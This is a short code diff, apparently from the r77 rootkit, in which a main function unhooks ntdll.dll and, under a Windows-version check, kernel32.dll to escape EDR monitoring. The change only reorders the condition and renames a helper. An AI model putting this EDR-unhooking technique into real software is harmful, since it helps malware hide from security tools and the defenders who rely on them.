@@ -12,7 +12,7 @@ int main()
 {
 	// Unhook DLL's that are monitored by EDR.
 	UnhookDll(L"ntdll.dll");
-	if (R77_IsWindows10OrGreater() || BITNESS(64))
+	if (BITNESS(64) || IsAtLeastWindows10())
 	{
 		// Unhooking kernel32.dll on Windows 7 x86 fails.
 		//TODO: Find out why unhooking kernel32.dll on Windows 7 x86 fails.
